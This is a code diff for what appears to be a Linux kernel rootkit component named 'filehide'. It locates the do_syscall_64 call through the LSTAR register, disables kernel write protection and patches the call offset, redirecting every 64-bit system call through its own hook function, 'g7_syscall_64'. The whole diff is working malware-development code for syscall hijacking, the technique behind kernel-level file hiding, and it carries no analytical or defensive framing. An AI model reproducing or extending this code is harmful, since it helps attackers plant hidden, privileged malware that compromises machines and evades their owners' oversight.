@@ -5,6 +5,7 @@
 
 #include "filehide_lstar.h"
 #include "common.h"
+#include "hook.h"
 
 #define SEARCHLEN  512
 
@@ -19,6 +20,7 @@ static const char *movSignExtended = "\x48\xc7\xc7";
 //The first call in entry_SYSCALL_64 is the right one, so grabbing it is easy
 static const char *callNearRelative = "\xE8";
 
+static void hexdump(char *, int);
 static unsigned long read_msr(unsigned int);
 static inline unsigned long mem_offset(char *ptr);
 static char *find_do_syscall_64(char *lstar_addr);
@@ -34,10 +36,17 @@ test_lstar(void)
     if(!do_syscall_64 || !syscall_64_ptr)
         return;
 
-    DEBUG_INFO("do_syscall_64 at %lx\n", (unsigned long)do_syscall_64);
-
     //Calculate new call offset to our function
-    
+    //newOff = g7_syscall_64_addr - nextOpcodeAddr
+    unsigned long newOff = (unsigned long)g7_syscall_64 - ((unsigned long)syscall_64_ptr + 5);
+
+    DEBUG_INFO("%lx\n", (unsigned long)do_syscall_64);
+    hexdump((char *)do_syscall_64, 128);
+    hexdump((char *)g7_syscall_64, 128);
+
+    disable_protection();
+    memcpy((syscall_64_ptr + 1), &newOff, 4);
+    enable_protection();
 }
 
 //Only use with multiples of 16..
@@ -47,7 +56,7 @@ hexdump(char *addr, int n)
     int k = 0;
 
     DEBUG_INFO("Hexdump:\n");
-    while(k <= n) {
+    while(k < n) {
         DEBUG_INFO("%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",
                 addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9], 
                 addr[k + 10], addr[k + 11], addr[k + 12], addr[k + 13], addr[k + 14], addr[k + 15]);
@@ -101,7 +110,7 @@ find_do_syscall_64(char *lstar_addr)
     unsigned long syscall64_off = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip opcode
 
     //Store correct address of do_syscall_64
-    do_syscall_64 = (void *)syscall64_call_ptr + syscall64_off;
+    do_syscall_64 = (void *)syscall64_call_ptr + syscall64_off + 1;
 
     return syscall64_call_ptr;
 }
@@ -109,6 +118,7 @@ find_do_syscall_64(char *lstar_addr)
 void
 g7_syscall_64(unsigned long nr, struct pt_regs *regs)
 {
+    DEBUG_INFO("Number is %lu\n", nr);
     do_syscall_64(nr, regs);
 }
 
